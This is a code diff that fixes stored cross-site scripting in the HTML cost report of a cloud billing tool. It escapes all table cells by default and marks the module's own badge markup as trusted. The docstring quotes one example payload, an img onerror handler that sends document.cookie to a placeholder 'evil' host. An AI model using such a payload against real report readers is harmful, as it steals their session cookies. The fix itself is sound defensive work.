@@ -166,6 +166,27 @@ def budgets_csv(data: dict) -> str:
 
 # ── HTML report ───────────────────────────────────────────────────────────────
 
+class SafeHTML(str):
+    """Markup this module built itself and vouches for.
+
+    Every other cell value is escaped. Resource names, service names, tag values
+    and account aliases all come from the customer's cloud, and a report is a
+    file someone opens in a browser and forwards to their finance team. A volume
+    named `<img src=x onerror="fetch('https://evil/'+document.cookie)">` was
+    written into the export as live markup, so whoever could name a resource
+    could run script in the reader's browser.
+
+    Escaping unconditionally would have flattened the severity and change badges
+    below into visible angle brackets, which is presumably why nothing escaped
+    at all. Marking the two places that produce markup is the version that keeps
+    both properties: safe by default, and deliberate where it is not.
+    """
+
+
+def _cell(value: Any) -> str:
+    return str(value) if isinstance(value, SafeHTML) else _html.escape(str(value))
+
+
 def _html_table(headers: list[str], rows: list[list[Any]], col_align: list[str] | None = None) -> str:
     if not rows:
         return "<p style='color:#94a3b8;font-size:13px'>No data.</p>"
@@ -173,7 +194,7 @@ def _html_table(headers: list[str], rows: list[list[Any]], col_align: list[str] 
     th = "".join(
         f"<th style='padding:8px 12px;text-align:{aligns[i]};font-weight:600;"
         f"font-size:12px;letter-spacing:.04em;text-transform:uppercase;"
-        f"color:{_MUTED};border-bottom:2px solid {_BORDER}'>{h}</th>"
+        f"color:{_MUTED};border-bottom:2px solid {_BORDER}'>{_cell(h)}</th>"
         for i, h in enumerate(headers)
     )
     body = ""
@@ -181,7 +202,7 @@ def _html_table(headers: list[str], rows: list[list[Any]], col_align: list[str] 
         bg = "#fff" if ri % 2 == 0 else _BG
         tds = "".join(
             f"<td style='padding:8px 12px;text-align:{aligns[ci]};"
-            f"font-size:13px;border-bottom:1px solid {_BORDER}'>{cell}</td>"
+            f"font-size:13px;border-bottom:1px solid {_BORDER}'>{_cell(cell)}</td>"
             for ci, cell in enumerate(row)
         )
         body += f"<tr style='background:{bg}'>{tds}</tr>"
@@ -219,13 +240,13 @@ def _change_badge(pct: float) -> str:
         color, arrow = _GREEN, "↓"
     else:
         color, arrow = _MUTED, "~"
-    return f"<span style='color:{color};font-weight:600'>{arrow}{abs(pct):.0f}%</span>"
+    return SafeHTML(f"<span style='color:{color};font-weight:600'>{arrow}{abs(pct):.0f}%</span>")
 
 
 def _severity_badge(sev: str) -> str:
     colors = {"high": _RED, "medium": _AMBER, "low": _MUTED}
     c = colors.get(sev.lower(), _MUTED)
-    return f"<span style='color:{c};font-weight:600;text-transform:uppercase;font-size:11px'>{sev}</span>"
+    return SafeHTML(f"<span style='color:{c};font-weight:600;text-transform:uppercase;font-size:11px'>{_html.escape(sev)}</span>")
 
 
 def build_html_report(
